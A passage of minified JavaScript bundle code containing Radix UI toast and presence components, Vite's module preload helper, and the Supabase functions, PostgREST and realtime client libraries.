T=Mo(s.current).includes(w.animationName);if(w.target===t&&T&&(p("ANIMATION_END"),!a.current)){const C=t.style.animationFillMode;t.style.animationFillMode="forwards",f=m.setTimeout(()=>{t.style.animationFillMode==="forwards"&&(t.style.animationFillMode=C)})}},v=w=>{w.target===t&&(c.current=Mo(s.current))};return t.addEventListener("animationstart",v),t.addEventListener("animationcancel",y),t.addEventListener("animationend",y),()=>{m.clearTimeout(f),t.removeEventListener("animationstart",v),t.removeEventListener("animationcancel",y),t.removeEventListener("animationend",y)}}else p("ANIMATION_END")},[t,p]),{isPresent:["mounted","unmountSuspended"].includes(h),ref:S.useCallback(f=>{s.current=f?getComputedStyle(f):null,r(f)},[])}}function Mo(n){return n?.animationName||"none"}function $2(n){let t=Object.getOwnPropertyDescriptor(n.props,"ref")?.get,r=t&&"isReactWarning"in t&&t.isReactWarning;return r?n.ref:(t=Object.getOwnPropertyDescriptor(n,"ref")?.get,r=t&&"isReactWarning"in t&&t.isReactWarning,r?n.props.ref:n.props.ref||n.ref)}var G2=ew[" useInsertionEffect ".trim().toString()]||cs;function q2({prop:n,defaultProp:t,onChange:r=()=>{},caller:s}){const[a,c,d]=K2({defaultProp:t,onChange:r}),h=n!==void 0,p=h?n:a;{const m=S.useRef(n!==void 0);S.useEffect(()=>{const y=m.current;y!==h&&console.warn(`${s} is changing from ${y?"controlled":"uncontrolled"} to ${h?"controlled":"uncontrolled"}. Components should not switch from controlled to uncontrolled (or vice versa). Decide between using a controlled or uncontrolled value for the lifetime of the component.`),m.current=h},[h,s])}const f=S.useCallback(m=>{if(h){const y=J2(m)?m(n):m;y!==n&&d.current?.(y)}else c(m)},[h,n,c,d]);return[p,f]}function K2({defaultProp:n,onChange:t}){const[r,s]=S.useState(n),a=S.useRef(r),c=S.useRef(t);return G2(()=>{c.current=t},[t]),S.useEffect(()=>{a.current!==r&&(c.current?.(r),a.current=r)},[r,a]),[r,s,c]}function J2(n){return typeof n=="function"}var Q2=Object.freeze({position:"absolute",border:0,width:1,height:1,padding:0,margin:-1,overflow:"hidden",clip:"rect(0, 0, 0, 0)",whiteSpace:"nowrap",wordWrap:"normal"}),Y2="VisuallyHidden",Rd=S.forwardRef((n,t)=>x.jsx(Xt.span,{...n,ref:t,style:{...Q2,...n.style}}));Rd.displayName=Y2;var Dd="ToastProvider",[Md,X2,Z2]=R2("Toast"),[wy,yS]=hy("Toast",[Z2]),[eT,la]=wy(Dd),ky=n=>{const{__scopeToast:t,label:r="Notification",duration:s=5e3,swipeDirection:a="right",swipeThreshold:c=50,children:d}=n,[h,p]=S.useState(null),[f,m]=S.useState(0),y=S.useRef(!1),v=S.useRef(!1);return r.trim()||console.error(`Invalid prop \`label\` supplied to \`${Dd}\`. Expected non-empty \`string\`.`),x.jsx(Md.Provider,{scope:t,children:x.jsx(eT,{scope:t,label:r,duration:s,swipeDirection:a,swipeThreshold:c,toastCount:f,viewport:h,onViewportChange:p,onToastAdd:S.useCallback(()=>m(w=>w+1),[]),onToastRemove:S.useCallback(()=>m(w=>w-1),[]),isFocusedToastEscapeKeyDownRef:y,isClosePausedRef:v,children:d})})};ky.displayName=Dd;var xy="ToastViewport",tT=["F8"],Qc="toast.viewportPause",Yc="toast.viewportResume",Ty=S.forwardRef((n,t)=>{const{__scopeToast:r,hotkey:s=tT,label:a="Notifications ({hotkey})",...c}=n,d=la(xy,r),h=X2(r),p=S.useRef(null),f=S.useRef(null),m=S.useRef(null),y=S.useRef(null),v=hn(t,y,d.onViewportChange),w=s.join("+").replace(/Key/g,"").replace(/Digit/g,""),E=d.toastCount>0;S.useEffect(()=>{const C=O=>{s.length!==0&&s.every(M=>O[M]||O.code===M)&&y.current?.focus()};return document.addEventListener("keydown",C),()=>document.removeEventListener("keydown",C)},[s]),S.useEffect(()=>{const C=p.current,O=y.current;if(E&&C&&O){const R=()=>{if(!d.isClosePausedRef.current){const J=new CustomEvent(Qc);O.dispatchEvent(J),d.isClosePausedRef.current=!0}},M=()=>{if(d.isClosePausedRef.current){const J=new CustomEvent(Yc);O.dispatchEvent(J),d.isClosePausedRef.current=!1}},L=J=>{!C.contains(J.relatedTarget)&&M()},W=()=>{C.contains(document.activeElement)||M()};return C.addEventListener("focusin",R),C.addEventListener("focusout",L),C.addEventListener("pointermove",R),C.addEventListener("pointerleave",W),window.addEventListener("blur",R),window.addEventListener("focus",M),()=>{C.removeEventListener("focusin",R),C.removeEventListener("focusout",L),C.removeEventListener("pointermove",R),C.removeEventListener("pointerleave",W),window.removeEventListener("blur",R),window.removeEventListener("focus",M)}}},[E,d.isClosePausedRef]);const T=S.useCallback(({tabbingDirection:C})=>{const R=h().map(M=>{const L=M.ref.current,W=[L,...fT(L)];return C==="forwards"?W:W.reverse()});return(C==="forwards"?R.reverse():R).flat()},[h]);return S.useEffect(()=>{const C=y.current;if(C){const O=R=>{const M=R.altKey||R.ctrlKey||R.metaKey;if(R.key==="Tab"&&!M){const W=document.activeElement,J=R.shiftKey;if(R.target===C&&J){f.current?.focus();return}const ne=T({tabbingDirection:J?"backwards":"forwards"}),ge=ne.findIndex(Ae=>Ae===W);Sc(ne.slice(ge+1))?R.preventDefault():J?f.current?.focus():m.current?.focus()}};return C.addEventListener("keydown",O),()=>C.removeEventListener("keydown",O)}},[h,T]),x.jsxs(U2,{ref:p,role:"region","aria-label":a.replace("{hotkey}",w),tabIndex:-1,style:{pointerEvents:E?void 0:"none"},children:[E&&x.jsx(Xc,{ref:f,onFocusFromOutsideViewport:()=>{const C=T({tabbingDirection:"forwards"});Sc(C)}}),x.jsx(Md.Slot,{scope:r,children:x.jsx(Xt.ol,{tabIndex:-1,...c,ref:v})}),E&&x.jsx(Xc,{ref:m,onFocusFromOutsideViewport:()=>{const C=T({tabbingDirection:"backwards"});Sc(C)}})]})});Ty.displayName=xy;var Sy="ToastFocusProxy",Xc=S.forwardRef((n,t)=>{const{__scopeToast:r,onFocusFromOutsideViewport:s,...a}=n,c=la(Sy,r);return x.jsx(Rd,{"aria-hidden":!0,tabIndex:0,...a,ref:t,style:{position:"fixed"},onFocus:d=>{const h=d.relatedTarget;!c.viewport?.contains(h)&&s()}})});Xc.displayName=Sy;var gs="Toast",iT="toast.swipeStart",nT="toast.swipeMove",rT="toast.swipeCancel",sT="toast.swipeEnd",Ay=S.forwardRef((n,t)=>{const{forceMount:r,open:s,defaultOpen:a,onOpenChange:c,...d}=n,[h,p]=q2({prop:s,defaultProp:a??!0,onChange:c,caller:gs});return x.jsx(vy,{present:r||h,children:x.jsx(lT,{open:h,...d,ref:t,onClose:()=>p(!1),onPause:pn(n.onPause),onResume:pn(n.onResume),onSwipeStart:Tt(n.onSwipeStart,f=>{f.currentTarget.setAttribute("data-swipe","start")}),onSwipeMove:Tt(n.onSwipeMove,f=>{const{x:m,y}=f.detail.delta;f.currentTarget.setAttribute("data-swipe","move"),f.currentTarget.style.setProperty("--radix-toast-swipe-move-x",`${m}px`),f.currentTarget.style.setProperty("--radix-toast-swipe-move-y",`${y}px`)}),onSwipeCancel:Tt(n.onSwipeCancel,f=>{f.currentTarget.setAttribute("data-swipe","cancel"),f.currentTarget.style.removeProperty("--radix-toast-swipe-move-x"),f.currentTarget.style.removeProperty("--radix-toast-swipe-move-y"),f.currentTarget.style.removeProperty("--radix-toast-swipe-end-x"),f.currentTarget.style.removeProperty("--radix-toast-swipe-end-y")}),onSwipeEnd:Tt(n.onSwipeEnd,f=>{const{x:m,y}=f.detail.delta;f.currentTarget.setAttribute("data-swipe","end"),f.currentTarget.style.removeProperty("--radix-toast-swipe-move-x"),f.currentTarget.style.removeProperty("--radix-toast-swipe-move-y"),f.currentTarget.style.setProperty("--radix-toast-swipe-end-x",`${m}px`),f.currentTarget.style.setProperty("--radix-toast-swipe-end-y",`${y}px`),p(!1)})})})});Ay.displayName=gs;var[oT,aT]=wy(gs,{onClose(){}}),lT=S.forwardRef((n,t)=>{const{__scopeToast:r,type:s="foreground",duration:a,open:c,onClose:d,onEscapeKeyDown:h,onPause:p,onResume:f,onSwipeStart:m,onSwipeMove:y,onSwipeCancel:v,onSwipeEnd:w,...E}=n,T=la(gs,r),[C,O]=S.useState(null),R=hn(t,$=>O($)),M=S.useRef(null),L=S.useRef(null),W=a||T.duration,J=S.useRef(0),G=S.useRef(W),X=S.useRef(0),{onToastAdd:ne,onToastRemove:ge}=T,Ae=pn(()=>{C?.contains(document.activeElement)&&T.viewport?.focus(),d()}),H=S.useCallback($=>{!$||$===1/0||(window.clearTimeout(X.current),J.current=new Date().getTime(),X.current=window.setTimeout(Ae,$))},[Ae]);S.useEffect(()=>{const $=T.viewport;if($){const he=()=>{H(G.current),f?.()},oe=()=>{const ue=new Date().getTime()-J.current;G.current=G.current-ue,window.clearTimeout(X.current),p?.()};return $.addEventListener(Qc,oe),$.addEventListener(Yc,he),()=>{$.removeEventListener(Qc,oe),$.removeEventListener(Yc,he)}}},[T.viewport,W,p,f,H]),S.useEffect(()=>{c&&!T.isClosePausedRef.current&&H(W)},[c,W,T.isClosePausedRef,H]),S.useEffect(()=>(ne(),()=>ge()),[ne,ge]);const ae=S.useMemo(()=>C?Dy(C):null,[C]);return T.viewport?x.jsxs(x.Fragment,{children:[ae&&x.jsx(cT,{__scopeToast:r,role:"status","aria-live":s==="foreground"?"assertive":"polite","aria-atomic":!0,children:ae}),x.jsx(oT,{scope:r,onClose:Ae,children:_d.createPortal(x.jsx(Md.ItemSlot,{scope:r,children:x.jsx(z2,{asChild:!0,onEscapeKeyDown:Tt(h,()=>{T.isFocusedToastEscapeKeyDownRef.current||Ae(),T.isFocusedToastEscapeKeyDownRef.current=!1}),children:x.jsx(Xt.li,{role:"status","aria-live":"off","aria-atomic":!0,tabIndex:0,"data-state":c?"open":"closed","data-swipe-direction":T.swipeDirection,...E,ref:R,style:{userSelect:"none",touchAction:"none",...n.style},onKeyDown:Tt(n.onKeyDown,$=>{$.key==="Escape"&&(h?.($.nativeEvent),$.nativeEvent.defaultPrevented||(T.isFocusedToastEscapeKeyDownRef.current=!0,Ae()))}),onPointerDown:Tt(n.onPointerDown,$=>{$.button===0&&(M.current={x:$.clientX,y:$.clientY})}),onPointerMove:Tt(n.onPointerMove,$=>{if(!M.current)return;const he=$.clientX-M.current.x,oe=$.clientY-M.current.y,ue=!!L.current,V=["left","right"].includes(T.swipeDirection),Q=["left","up"].includes(T.swipeDirection)?Math.min:Math.max,q=V?Q(0,he):0,P=V?0:Q(0,oe),B=$.pointerType==="touch"?10:2,te={x:q,y:P},de={originalEvent:$,delta:te};ue?(L.current=te,jo(nT,y,de,{discrete:!1})):ig(te,T.swipeDirection,B)?(L.current=te,jo(iT,m,de,{discrete:!1}),$.target.setPointerCapture($.pointerId)):(Math.abs(he)>B||Math.abs(oe)>B)&&(M.current=null)}),onPointerUp:Tt(n.onPointerUp,$=>{const he=L.current,oe=$.target;if(oe.hasPointerCapture($.pointerId)&&oe.releasePointerCapture($.pointerId),L.current=null,M.current=null,he){const ue=$.currentTarget,V={originalEvent:$,delta:he};ig(he,T.swipeDirection,T.swipeThreshold)?jo(sT,w,V,{discrete:!0}):jo(rT,v,V,{discrete:!0}),ue.addEventListener("click",Q=>Q.preventDefault(),{once:!0})}})})})}),T.viewport)})]}):null}),cT=n=>{const{__scopeToast:t,children:r,...s}=n,a=la(gs,t),[c,d]=S.useState(!1),[h,p]=S.useState(!1);return hT(()=>d(!0)),S.useEffect(()=>{const f=window.setTimeout(()=>p(!0),1e3);return()=>window.clearTimeout(f)},[]),h?null:x.jsx(by,{asChild:!0,children:x.jsx(Rd,{...s,children:c&&x.jsxs(x.Fragment,{children:[a.label," ",r]})})})},dT="ToastTitle",Cy=S.forwardRef((n,t)=>{const{__scopeToast:r,...s}=n;return x.jsx(Xt.div,{...s,ref:t})});Cy.displayName=dT;var uT="ToastDescription",Py=S.forwardRef((n,t)=>{const{__scopeToast:r,...s}=n;return x.jsx(Xt.div,{...s,ref:t})});Py.displayName=uT;var Ey="ToastAction",Iy=S.forwardRef((n,t)=>{const{altText:r,...s}=n;return r.trim()?x.jsx(Ry,{altText:r,asChild:!0,children:x.jsx(jd,{...s,ref:t})}):(console.error(`Invalid prop \`altText\` supplied to \`${Ey}\`. Expected non-empty \`string\`.`),null)});Iy.displayName=Ey;var _y="ToastClose",jd=S.forwardRef((n,t)=>{const{__scopeToast:r,...s}=n,a=aT(_y,r);return x.jsx(Ry,{asChild:!0,children:x.jsx(Xt.button,{type:"button",...s,ref:t,onClick:Tt(n.onClick,a.onClose)})})});jd.displayName=_y;var Ry=S.forwardRef((n,t)=>{const{__scopeToast:r,altText:s,...a}=n;return x.jsx(Xt.div,{"data-radix-toast-announce-exclude":"","data-radix-toast-announce-alt":s||void 0,...a,ref:t})});function Dy(n){const t=[];return Array.from(n.childNodes).forEach(s=>{if(s.nodeType===s.TEXT_NODE&&s.textContent&&t.push(s.textContent),pT(s)){const a=s.ariaHidden||s.hidden||s.style.display==="none",c=s.dataset.radixToastAnnounceExclude==="";if(!a)if(c){const d=s.dataset.radixToastAnnounceAlt;d&&t.push(d)}else t.push(...Dy(s))}}),t}function jo(n,t,r,{discrete:s}){const a=r.originalEvent.currentTarget,c=new CustomEvent(n,{bubbles:!0,cancelable:!0,detail:r});t&&a.addEventListener(n,t,{once:!0}),s?py(a,c):a.dispatchEvent(c)}var ig=(n,t,r=0)=>{const s=Math.abs(n.x),a=Math.abs(n.y),c=s>a;return t==="left"||t==="right"?c&&s>r:!c&&a>r};function hT(n=()=>{}){const t=pn(n);cs(()=>{let r=0,s=0;return r=window.requestAnimationFrame(()=>s=window.requestAnimationFrame(t)),()=>{window.cancelAnimationFrame(r),window.cancelAnimationFrame(s)}},[t])}function pT(n){return n.nodeType===n.ELEMENT_NODE}function fT(n){const t=[],r=document.createTreeWalker(n,NodeFilter.SHOW_ELEMENT,{acceptNode:s=>{const a=s.tagName==="INPUT"&&s.type==="hidden";return s.disabled||s.hidden||a?NodeFilter.FILTER_SKIP:s.tabIndex>=0?NodeFilter.FILTER_ACCEPT:NodeFilter.FILTER_SKIP}});for(;r.nextNode();)t.push(r.currentNode);return t}function Sc(n){const t=document.activeElement;return n.some(r=>r===t?!0:(r.focus(),document.activeElement!==t))}var gT=ky,My=Ty,jy=Ay,Ly=Cy,Oy=Py,By=Iy,Ny=jd;const mT=1,yT=1e6,li={ADD_TOAST:"ADD_TOAST",UPDATE_TOAST:"UPDATE_TOAST",DISMISS_TOAST:"DISMISS_TOAST",REMOVE_TOAST:"REMOVE_TOAST"};let Ac=0;function bT(){return Ac=(Ac+1)%Number.MAX_VALUE,Ac.toString()}const Cc=new Map,ng=n=>{if(Cc.has(n))return;const t=setTimeout(()=>{Cc.delete(n),ns({type:li.REMOVE_TOAST,toastId:n})},yT);Cc.set(n,t)},vT=(n,t)=>{switch(t.type){case li.ADD_TOAST:return{...n,toasts:[t.toast,...n.toasts].slice(0,mT)};case li.UPDATE_TOAST:return{...n,toasts:n.toasts.map(r=>r.id===t.toast.id?{...r,...t.toast}:r)};case li.DISMISS_TOAST:{const{toastId:r}=t;return r?ng(r):n.toasts.forEach(s=>{ng(s.id)}),{...n,toasts:n.toasts.map(s=>s.id===r||r===void 0?{...s,open:!1}:s)}}case li.REMOVE_TOAST:return t.toastId===void 0?{...n,toasts:[]}:{...n,toasts:n.toasts.filter(r=>r.id!==t.toastId)}}},zo=[];let Uo={toasts:[]};function ns(n){Uo=vT(Uo,n),zo.forEach(t=>{t(Uo)})}function wT(n){const t=bT(),r=a=>ns({type:li.UPDATE_TOAST,toast:{...a,id:t}}),s=()=>ns({type:li.DISMISS_TOAST,toastId:t});return ns({type:li.ADD_TOAST,toast:{...n,id:t,open:!0,onOpenChange:a=>{a||s()}}}),{id:t,dismiss:s,update:r}}function Ld(){const[n,t]=Pe.useState(Uo);return Pe.useEffect(()=>(zo.push(t),()=>{const r=zo.indexOf(t);r>-1&&zo.splice(r,1)}),[n]),{...n,toast:wT,dismiss:r=>ns({type:li.DISMISS_TOAST,toastId:r})}}const kT="modulepreload",xT=function(n){return"/"+n},rg={},nr=function(t,r,s){let a=Promise.resolve();if(r&&r.length>0){let p=function(f){return Promise.all(f.map(m=>Promise.resolve(m).then(y=>({status:"fulfilled",value:y}),y=>({status:"rejected",reason:y}))))};document.getElementsByTagName("link");const d=document.querySelector("meta[property=csp-nonce]"),h=d?.nonce||d?.getAttribute("nonce");a=p(r.map(f=>{if(f=xT(f),f in rg)return;rg[f]=!0;const m=f.endsWith(".css"),y=m?'[rel="stylesheet"]':"";if(document.querySelector(`link[href="${f}"]${y}`))return;const v=document.createElement("link");if(v.rel=m?"stylesheet":kT,m||(v.as="script"),v.crossOrigin="",v.href=f,h&&v.setAttribute("nonce",h),document.head.appendChild(v),m)return new Promise((w,E)=>{v.addEventListener("load",w),v.addEventListener("error",()=>E(new Error(`Unable to preload CSS for ${f}`)))})}))}function c(d){const h=new Event("vite:preloadError",{cancelable:!0});if(h.payload=d,window.dispatchEvent(h),!h.defaultPrevented)throw d}return a.then(d=>{for(const h of d||[])h.status==="rejected"&&c(h.reason);return t().catch(c)})},TT=n=>{let t;return n?t=n:typeof fetch>"u"?t=(...r)=>nr(async()=>{const{default:s}=await Promise.resolve().then(()=>ms);return{default:s}},void 0).then(({default:s})=>s(...r)):t=fetch,(...r)=>t(...r)};class Od extends Error{constructor(t,r="FunctionsError",s){super(t),this.name=r,this.context=s}}class ST extends Od{constructor(t){super("Failed to send a request to the Edge Function","FunctionsFetchError",t)}}class AT extends Od{constructor(t){super("Relay Error invoking the Edge Function","FunctionsRelayError",t)}}class CT extends Od{constructor(t){super("Edge Function returned a non-2xx status code","FunctionsHttpError",t)}}var PT=function(n,t,r,s){function a(c){return c instanceof r?c:new r(function(d){d(c)})}return new(r||(r=Promise))(function(c,d){function h(m){try{f(s.next(m))}catch(y){d(y)}}function p(m){try{f(s.throw(m))}catch(y){d(y)}}function f(m){m.done?c(m.value):a(m.value).then(h,p)}f((s=s.apply(n,t||[])).next())})};class ET{constructor(t,{headers:r={},customFetch:s}={}){this.url=t,this.headers=r,this.fetch=TT(s)}setAuth(t){this.headers.Authorization=`Bearer ${t}`}invoke(t,r={}){var s;return PT(this,void 0,void 0,function*(){try{const{headers:a,method:c,body:d}=r;let h={},p;d&&(a&&!Object.prototype.hasOwnProperty.call(a,"Content-Type")||!a)&&(typeof Blob<"u"&&d instanceof Blob||d instanceof ArrayBuffer?(h["Content-Type"]="application/octet-stream",p=d):typeof d=="string"?(h["Content-Type"]="text/plain",p=d):typeof FormData<"u"&&d instanceof FormData?p=d:(h["Content-Type"]="application/json",p=JSON.stringify(d)));const f=yield this.fetch(`${this.url}/${t}`,{method:c||"POST",headers:Object.assign(Object.assign(Object.assign({},h),this.headers),a),body:p}).catch(w=>{throw new ST(w)}),m=f.headers.get("x-relay-error");if(m&&m==="true")throw new AT(f);if(!f.ok)throw new CT(f);let y=((s=f.headers.get("Content-Type"))!==null&&s!==void 0?s:"text/plain").split(";")[0].trim(),v;return y==="application/json"?v=yield f.json():y==="application/octet-stream"?v=yield f.blob():y==="multipart/form-data"?v=yield f.formData():v=yield f.text(),{data:v,error:null}}catch(a){return{data:null,error:a}}})}}var IT=function(){if(typeof self<"u")return self;if(typeof window<"u")return window;if(typeof global<"u")return global;throw new Error("unable to locate global object")},rr=IT();const _T=rr.fetch,Bd=rr.fetch.bind(rr),Fy=rr.Headers,RT=rr.Request,DT=rr.Response,ms=Object.freeze(Object.defineProperty({__proto__:null,Headers:Fy,Request:RT,Response:DT,default:Bd,fetch:_T},Symbol.toStringTag,{value:"Module"}));class MT{constructor(t){this.shouldThrowOnError=!1,this.method=t.method,this.url=t.url,this.headers=t.headers,this.schema=t.schema,this.body=t.body,this.shouldThrowOnError=t.shouldThrowOnError,this.signal=t.signal,this.isMaybeSingle=t.isMaybeSingle,t.fetch?this.fetch=t.fetch:typeof fetch>"u"?this.fetch=Bd:this.fetch=fetch}throwOnError(){return this.shouldThrowOnError=!0,this}then(t,r){this.schema===void 0||(["GET","HEAD"].includes(this.method)?this.headers["Accept-Profile"]=this.schema:this.headers["Content-Profile"]=this.schema),this.method!=="GET"&&this.method!=="HEAD"&&(this.headers["Content-Type"]="application/json");const s=this.fetch;let a=s(this.url.toString(),{method:this.method,headers:this.headers,body:JSON.stringify(this.body),signal:this.signal}).then(async c=>{var d,h,p;let f=null,m=null,y=null,v=c.status,w=c.statusText;if(c.ok){if(this.method!=="HEAD"){const O=await c.text();O===""||(this.headers.Accept==="text/csv"||this.headers.Accept&&this.headers.Accept.includes("application/vnd.pgrst.plan+text")?m=O:m=JSON.parse(O))}const T=(d=this.headers.Prefer)===null||d===void 0?void 0:d.match(/count=(exact|planned|estimated)/),C=(h=c.headers.get("content-range"))===null||h===void 0?void 0:h.split("/");T&&C&&C.length>1&&(y=parseInt(C[1])),this.isMaybeSingle&&this.method==="GET"&&Array.isArray(m)&&(m.length>1?(f={code:"PGRST116",details:`Results contain ${m.length} rows, application/vnd.pgrst.object+json requires 1 row`,hint:null,message:"JSON object requested, multiple (or no) rows returned"},m=null,y=null,v=406,w="Not Acceptable"):m.length===1?m=m[0]:m=null)}else{const T=await c.text();try{f=JSON.parse(T),Array.isArray(f)&&c.status===404&&(m=[],f=null,v=200,w="OK")}catch{c.status===404&&T===""?(v=204,w="No Content"):f={message:T}}if(f&&this.isMaybeSingle&&(!((p=f?.details)===null||p===void 0)&&p.includes("0 rows"))&&(f=null,v=200,w="OK"),f&&this.shouldThrowOnError)throw f}return{error:f,data:m,count:y,status:v,statusText:w}});return this.shouldThrowOnError||(a=a.catch(c=>{var d,h,p;return{error:{message:`${(d=c?.name)!==null&&d!==void 0?d:"FetchError"}: ${c?.message}`,details:`${(h=c?.stack)!==null&&h!==void 0?h:""}`,hint:"",code:`${(p=c?.code)!==null&&p!==void 0?p:""}`},data:null,count:null,status:0,statusText:""}})),a.then(t,r)}}class jT extends MT{select(t){let r=!1;const s=(t??"*").split("").map(a=>/\s/.test(a)&&!r?"":(a==='"'&&(r=!r),a)).join("");return this.url.searchParams.set("select",s),this.headers.Prefer&&(this.headers.Prefer+=","),this.headers.Prefer+="return=representation",this}order(t,{ascending:r=!0,nullsFirst:s,foreignTable:a,referencedTable:c=a}={}){const d=c?`${c}.order`:"order",h=this.url.searchParams.get(d);return this.url.searchParams.set(d,`${h?`${h},`:""}${t}.${r?"asc":"desc"}${s===void 0?"":s?".nullsfirst":".nullslast"}`),this}limit(t,{foreignTable:r,referencedTable:s=r}={}){const a=typeof s>"u"?"limit":`${s}.limit`;return this.url.searchParams.set(a,`${t}`),this}range(t,r,{foreignTable:s,referencedTable:a=s}={}){const c=typeof a>"u"?"offset":`${a}.offset`,d=typeof a>"u"?"limit":`${a}.limit`;return this.url.searchParams.set(c,`${t}`),this.url.searchParams.set(d,`${r-t+1}`),this}abortSignal(t){return this.signal=t,this}single(){return this.headers.Accept="application/vnd.pgrst.object+json",this}maybeSingle(){return this.method==="GET"?this.headers.Accept="application/json":this.headers.Accept="application/vnd.pgrst.object+json",this.isMaybeSingle=!0,this}csv(){return this.headers.Accept="text/csv",this}geojson(){return this.headers.Accept="application/geo+json",this}explain({analyze:t=!1,verbose:r=!1,settings:s=!1,buffers:a=!1,wal:c=!1,format:d="text"}={}){var h;const p=[t?"analyze":null,r?"verbose":null,s?"settings":null,a?"buffers":null,c?"wal":null].filter(Boolean).join("|"),f=(h=this.headers.Accept)!==null&&h!==void 0?h:"application/json";return this.headers.Accept=`application/vnd.pgrst.plan+${d}; for="${f}"; options=${p};`,d==="json"?this:this}rollback(){var t;return((t=this.headers.Prefer)!==null&&t!==void 0?t:"").trim().length>0?this.headers.Prefer+=",tx=rollback":this.headers.Prefer="tx=rollback",this}returns(){return this}}class Kn extends jT{eq(t,r){return this.url.searchParams.append(t,`eq.${r}`),this}neq(t,r){return this.url.searchParams.append(t,`neq.${r}`),this}gt(t,r){return this.url.searchParams.append(t,`gt.${r}`),this}gte(t,r){return this.url.searchParams.append(t,`gte.${r}`),this}lt(t,r){return this.url.searchParams.append(t,`lt.${r}`),this}lte(t,r){return this.url.searchParams.append(t,`lte.${r}`),this}like(t,r){return this.url.searchParams.append(t,`like.${r}`),this}likeAllOf(t,r){return this.url.searchParams.append(t,`like(all).{${r.join(",")}}`),this}likeAnyOf(t,r){return this.url.searchParams.append(t,`like(any).{${r.join(",")}}`),this}ilike(t,r){return this.url.searchParams.append(t,`ilike.${r}`),this}ilikeAllOf(t,r){return this.url.searchParams.append(t,`ilike(all).{${r.join(",")}}`),this}ilikeAnyOf(t,r){return this.url.searchParams.append(t,`ilike(any).{${r.join(",")}}`),this}is(t,r){return this.url.searchParams.append(t,`is.${r}`),this}in(t,r){const s=r.map(a=>typeof a=="string"&&new RegExp("[,()]").test(a)?`"${a}"`:`${a}`).join(",");return this.url.searchParams.append(t,`in.(${s})`),this}contains(t,r){return typeof r=="string"?this.url.searchParams.append(t,`cs.${r}`):Array.isArray(r)?this.url.searchParams.append(t,`cs.{${r.join(",")}}`):this.url.searchParams.append(t,`cs.${JSON.stringify(r)}`),this}containedBy(t,r){return typeof r=="string"?this.url.searchParams.append(t,`cd.${r}`):Array.isArray(r)?this.url.searchParams.append(t,`cd.{${r.join(",")}}`):this.url.searchParams.append(t,`cd.${JSON.stringify(r)}`),this}rangeGt(t,r){return this.url.searchParams.append(t,`sr.${r}`),this}rangeGte(t,r){return this.url.searchParams.append(t,`nxl.${r}`),this}rangeLt(t,r){return this.url.searchParams.append(t,`sl.${r}`),this}rangeLte(t,r){return this.url.searchParams.append(t,`nxr.${r}`),this}rangeAdjacent(t,r){return this.url.searchParams.append(t,`adj.${r}`),this}overlaps(t,r){return typeof r=="string"?this.url.searchParams.append(t,`ov.${r}`):this.url.searchParams.append(t,`ov.{${r.join(",")}}`),this}textSearch(t,r,{config:s,type:a}={}){let c="";a==="plain"?c="pl":a==="phrase"?c="ph":a==="websearch"&&(c="w");const d=s===void 0?"":`(${s})`;return this.url.searchParams.append(t,`${c}fts${d}.${r}`),this}match(t){return Object.entries(t).forEach(([r,s])=>{this.url.searchParams.append(r,`eq.${s}`)}),this}not(t,r,s){return this.url.searchParams.append(t,`not.${r}.${s}`),this}or(t,{foreignTable:r,referencedTable:s=r}={}){const a=s?`${s}.or`:"or";return this.url.searchParams.append(a,`(${t})`),this}filter(t,r,s){return this.url.searchParams.append(t,`${r}.${s}`),this}}class LT{constructor(t,{headers:r={},schema:s,fetch:a}){this.url=t,this.headers=r,this.schema=s,this.fetch=a}select(t,{head:r=!1,count:s}={}){const a=r?"HEAD":"GET";let c=!1;const d=(t??"*").split("").map(h=>/\s/.test(h)&&!c?"":(h==='"'&&(c=!c),h)).join("");return this.url.searchParams.set("select",d),s&&(this.headers.Prefer=`count=${s}`),new Kn({method:a,url:this.url,headers:this.headers,schema:this.schema,fetch:this.fetch,allowEmpty:!1})}insert(t,{count:r,defaultToNull:s=!0}={}){const a="POST",c=[];if(this.headers.Prefer&&c.push(this.headers.Prefer),r&&c.push(`count=${r}`),s||c.push("missing=default"),this.headers.Prefer=c.join(","),Array.isArray(t)){const d=t.reduce((h,p)=>h.concat(Object.keys(p)),[]);if(d.length>0){const h=[...new Set(d)].map(p=>`"${p}"`);this.url.searchParams.set("columns",h.join(","))}}return new Kn({method:a,url:this.url,headers:this.headers,schema:this.schema,body:t,fetch:this.fetch,allowEmpty:!1})}upsert(t,{onConflict:r,ignoreDuplicates:s=!1,count:a,defaultToNull:c=!0}={}){const d="POST",h=[`resolution=${s?"ignore":"merge"}-duplicates`];if(r!==void 0&&this.url.searchParams.set("on_conflict",r),this.headers.Prefer&&h.push(this.headers.Prefer),a&&h.push(`count=${a}`),c||h.push("missing=default"),this.headers.Prefer=h.join(","),Array.isArray(t)){const p=t.reduce((f,m)=>f.concat(Object.keys(m)),[]);if(p.length>0){const f=[...new Set(p)].map(m=>`"${m}"`);this.url.searchParams.set("columns",f.join(","))}}return new Kn({method:d,url:this.url,headers:this.headers,schema:this.schema,body:t,fetch:this.fetch,allowEmpty:!1})}update(t,{count:r}={}){const s="PATCH",a=[];return this.headers.Prefer&&a.push(this.headers.Prefer),r&&a.push(`count=${r}`),this.headers.Prefer=a.join(","),new Kn({method:s,url:this.url,headers:this.headers,schema:this.schema,body:t,fetch:this.fetch,allowEmpty:!1})}delete({count:t}={}){const r="DELETE",s=[];return t&&s.push(`count=${t}`),this.headers.Prefer&&s.unshift(this.headers.Prefer),this.headers.Prefer=s.join(","),new Kn({method:r,url:this.url,headers:this.headers,schema:this.schema,fetch:this.fetch,allowEmpty:!1})}}const OT="1.9.0",BT={"X-Client-Info":`postgrest-js/${OT}`};class Nd{constructor(t,{headers:r={},schema:s,fetch:a}={}){this.url=t,this.headers=Object.assign(Object.assign({},BT),r),this.schemaName=s,this.fetch=a}from(t){const r=new URL(`${this.url}/${t}`);return new LT(r,{headers:Object.assign({},this.headers),schema:this.schemaName,fetch:this.fetch})}schema(t){return new Nd(this.url,{headers:this.headers,schema:t,fetch:this.fetch})}rpc(t,r={},{head:s=!1,count:a}={}){let c;const d=new URL(`${this.url}/rpc/${t}`);let h;s?(c="HEAD",Object.entries(r).forEach(([f,m])=>{d.searchParams.append(f,`${m}`)})):(c="POST",h=r);const p=Object.assign({},this.headers);return a&&(p.Prefer=`count=${a}`),new Kn({method:c,url:d,headers:p,schema:this.schemaName,body:h,fetch:this.fetch,allowEmpty:!1})}}const NT="2.9.1",FT={"X-Client-Info":`realtime-js/${NT}`},zT="1.0.0",zy=1e4,UT=1e3;var er;(function(n){n[n.connecting=0]="connecting",n[n.open=1]="open",n[n.closing=2]="closing",n[n.closed=3]="closed"})(er||(er={}));var 